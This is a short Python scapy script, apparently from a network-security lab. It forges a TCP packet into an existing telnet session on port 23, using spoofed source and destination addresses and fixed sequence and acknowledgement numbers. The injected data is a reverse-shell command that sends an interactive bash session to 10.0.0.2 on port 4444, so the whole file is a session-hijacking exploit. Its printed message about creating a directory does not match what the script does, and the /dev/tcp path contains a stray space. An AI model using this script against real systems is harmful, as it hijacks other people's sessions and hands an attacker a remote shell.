#!/usr/bin/python3

import sys
from scapy.all import *



print("CREATING ATTACKER DIRECTORY…")

IPLayer = IP (src="10.4.0.2", dst="10.4.1.15")

TCPLayer = TCP (sport=49720, dport=23, flags="A", seq=1587320262, ack=1025669806)

Data= "\r /bin/bash -i > /dev/tcp /10.0.0.2/4444 2>&1 0<&1 \r "

pkt=IPLayer/TCPLayer/Data

ls(pkt)

send(pkt,verbose=0)












